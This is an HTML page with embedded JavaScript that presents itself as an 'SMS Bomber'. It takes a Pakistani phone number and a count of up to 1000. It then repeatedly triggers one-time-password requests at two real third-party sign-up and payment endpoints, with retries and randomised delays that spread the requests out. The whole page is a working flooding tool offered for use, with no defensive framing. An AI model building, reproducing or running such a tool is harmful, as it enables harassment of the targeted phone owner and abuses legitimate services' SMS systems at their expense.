<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ULTIMATE SMS Bomber - Developed by RAMZAN AHSAN</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #121212;
            color: #fff;
            text-align: center;
        }
        
        h1 {
            color: #ff5555;
            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
            margin-bottom: 5px;
        }
        
        .subtitle {
            color: #aaa;
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        input {
            padding: 10px;
            width: 100%;
            max-width: 300px;
            border: 1px solid #444;
            border-radius: 5px;
            background-color: #222;
            color: #fff;
            margin-bottom: 10px;
        }
        
        button {
            background-color: #ff5555;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
            box-shadow: 0 0 10px rgba(255, 85, 85, 0.5);
        }
        
        button:hover {
            background-color: #ff3333;
            box-shadow: 0 0 20px rgba(255, 85, 85, 0.8);
            transform: scale(1.05);
        }
        
        #status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            font-weight: bold;
            transition: all 0.3s;
        }
        
        .telegram-btn {
            display: inline-block;
            margin-top: 30px;
            padding: 10px 20px;
            background-color: #0088cc;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            transition: all 0.3s;
            box-shadow: 0 0 10px rgba(0, 136, 204, 0.5);
        }
        
        .telegram-btn:hover {
            background-color: #006699;
            box-shadow: 0 0 20px rgba(0, 136, 204, 0.8);
            transform: scale(1.05);
        }
        
        .glow {
            animation: glow 2s infinite alternate;
        }
        
        @keyframes glow {
            from {
                box-shadow: 0 0 5px rgba(255, 85, 85, 0.5);
            }
            to {
                box-shadow: 0 0 20px rgba(255, 85, 85, 0.8);
            }
        }
        
        .counter {
            margin-top: 10px;
            font-size: 14px;
            color: #aaa;
        }
        
        .progress-container {
            width: 100%;
            max-width: 300px;
            margin: 20px auto;
            background-color: #222;
            border-radius: 5px;
            padding: 3px;
        }
        
        .progress-bar {
            height: 20px;
            border-radius: 3px;
            background-color: #4CAF50;
            width: 0%;
            transition: width 0.3s;
        }
        
        .batch-info {
            margin-top: 15px;
            font-size: 13px;
            color: #888;
        }
        
        .stop-btn {
            background-color: #333;
            margin-left: 10px;
        }
        
        .timer {
            font-size: 18px;
            margin-top: 10px;
            color: #ff5555;
        }
    </style>
</head>
<body>
    <h1>ULTIMATE SMS BOMBER</h1>
    <div class="subtitle">Developed by RAMZAN AHSAN</div>
    
    <div class="input-group">
        <input type="text" id="phone" placeholder="Enter phone number (923xxxxxxxxx)" pattern="923[0-9]{9}" required>
    </div>
    
    <div class="input-group">
        <input type="number" id="count" placeholder="Total OTPs to send (1-1000)" min="1" max="1000" required>
    </div>
    
    <div>
        <button onclick="startBombing()" class="glow" id="bombBtn">Start Bombing</button>
        <button onclick="stopBombing()" class="stop-btn" id="stopBtn" disabled>Stop</button>
    </div>
    
    <div class="progress-container">
        <div class="progress-bar" id="progress"></div>
    </div>
    
    <div id="status">Ready to bomb</div>
    <div id="counter" class="counter"></div>
    <div id="batchInfo" class="batch-info"></div>
    <div id="timer" class="timer"></div>
    
    <a href="https://t.me/Tips0Courses" class="telegram-btn" target="_blank">
        Join Telegram Channel
    </a>

    <script>
        let bombingInterval;
        let isBombing = false;
        let totalRequested = 0;
        let totalSent = 0;
        let totalSuccess = 0;
        let totalFailures = 0;
        let countdownInterval;
        let secondsLeft = 0;
        
        async function startBombing() {
            if (isBombing) return;
            
            const phone = document.getElementById('phone').value;
            totalRequested = parseInt(document.getElementById('count').value);
            
            // Validate inputs
            if (!phone.match(/^923[0-9]{9}$/)) {
                alert('Please enter a valid phone number in format 923xxxxxxxxx');
                return;
            }
            
            if (!totalRequested || totalRequested < 1 || totalRequested > 1000) {
                alert('Please enter a valid OTP count (1-1000).');
                return;
            }

            // Initialize
            isBombing = true;
            totalSent = 0;
            totalSuccess = 0;
            totalFailures = 0;
            
            const bombBtn = document.getElementById('bombBtn');
            const stopBtn = document.getElementById('stopBtn');
            bombBtn.disabled = true;
            stopBtn.disabled = false;
            
            const status = document.getElementById('status');
            const counter = document.getElementById('counter');
            const progress = document.getElementById('progress');
            const batchInfo = document.getElementById('batchInfo');
            const timer = document.getElementById('timer');
            
            status.innerText = 'Starting bombing sequence...';
            status.style.color = '#FFC107';
            status.style.backgroundColor = 'rgba(255, 193, 7, 0.2)';
            progress.style.width = '0%';
            
            // Start the bombing process
            await processBatch();
            
            async function processBatch() {
                if (!isBombing || totalSent >= totalRequested) {
                    stopBombing();
                    return;
                }
                
                const batchSize = Math.min(3, totalRequested - totalSent);
                batchInfo.innerText = `Sending batch of ${batchSize} OTPs...`;
                timer.innerText = '';
                
                // Send current batch
                const results = await sendBatch(phone, batchSize);
                totalSent += batchSize;
                totalSuccess += results.success;
                totalFailures += results.failures;
                
                // Update UI
                progress.style.width = `${(totalSent/totalRequested)*100}%`;
                counter.innerText = `Sent: ${totalSent}/${totalRequested} | Success: ${totalSuccess} | Failed: ${totalFailures}`;
                status.innerText = `Batch completed (${results.success}/${batchSize} succeeded)`;
                
                // Check if we've reached the target
                if (totalSent >= totalRequested) {
                    stopBombing();
                    status.innerText = 'Bombing completed successfully!';
                    status.style.color = '#4CAF50';
                    status.style.backgroundColor = 'rgba(76, 175, 80, 0.2)';
                    batchInfo.innerText = `Final: ${totalSuccess}/${totalRequested} (${Math.round((totalSuccess/totalRequested)*100)}% success)`;
                    timer.innerText = '';
                    return;
                }
                
                // Start 15-second countdown for next batch
                secondsLeft = 15;
                updateTimer();
                countdownInterval = setInterval(() => {
                    secondsLeft--;
                    updateTimer();
                    if (secondsLeft <= 0) {
                        clearInterval(countdownInterval);
                        processBatch();
                    }
                }, 1000);
            }
            
            function updateTimer() {
                timer.innerText = `Next batch in: ${secondsLeft}s`;
            }
        }
        
        function stopBombing() {
            clearInterval(bombingInterval);
            clearInterval(countdownInterval);
            isBombing = false;
            
            const bombBtn = document.getElementById('bombBtn');
            const stopBtn = document.getElementById('stopBtn');
            bombBtn.disabled = false;
            stopBtn.disabled = true;
            
            document.getElementById('timer').innerText = '';
            
            if (totalSent < totalRequested) {
                document.getElementById('status').innerText = 'Bombing stopped by user';
                document.getElementById('batchInfo').innerText = `Partial: ${totalSuccess}/${totalSent} sent`;
            }
        }
        
        async function sendBatch(phone, batchSize) {
            const apiConfigs = [
                {
                    url: `https://bajao.pk/api/v2/login/generatePin?uuid=${phone}`,
                    method: 'POST',
                    headers: {},
                    body: null,
                    retries: 2,
                    delay: 1000
                },
                {
                    url: `https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage`,
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'accept': 'application/json'
                    },
                    body: JSON.stringify({
                        Version: 'V1',
                        Language: 'en',
                        Platform: 'web',
                        ProductId: 1733,
                        MobileNo: phone,
                        OperatorId: '100007',
                        URL: 'https://www.tapmad.com/sign-up',
                        source: 'organic',
                        medium: 'organic'
                    }),
                    retries: 2,
                    delay: 1200
                }
            ];
            
            let batchSuccess = 0;
            let batchFailures = 0;
            
            // Send all requests in current batch
            for (let i = 0; i < batchSize; i++) {
                const apiIndex = i % apiConfigs.length;
                const currentApi = apiConfigs[apiIndex];
                
                // Add variable delay between OTPs in batch
                await new Promise(resolve => setTimeout(resolve, currentApi.delay + Math.random() * 500));
                
                let attempts = 0;
                let success = false;
                
                while (attempts <= currentApi.retries && !success) {
                    try {
                        const response = await fetch(currentApi.url, {
                            method: currentApi.method,
                            headers: currentApi.headers,
                            body: currentApi.body
                        });
                        
                        if (response.ok) {
                            success = true;
                            batchSuccess++;
                        } else {
                            throw new Error(`API returned ${response.status}`);
                        }
                    } catch (error) {
                        attempts++;
                        if (attempts > currentApi.retries) {
                            batchFailures++;
                            console.error(`Failed to send OTP after ${currentApi.retries} retries:`, error);
                        } else {
                            // Wait before retry
                            await new Promise(resolve => setTimeout(resolve, 800));
                        }
                    }
                }
            }
            
            return { success: batchSuccess, failures: batchFailures };
        }
    </script>
</body>
</html>
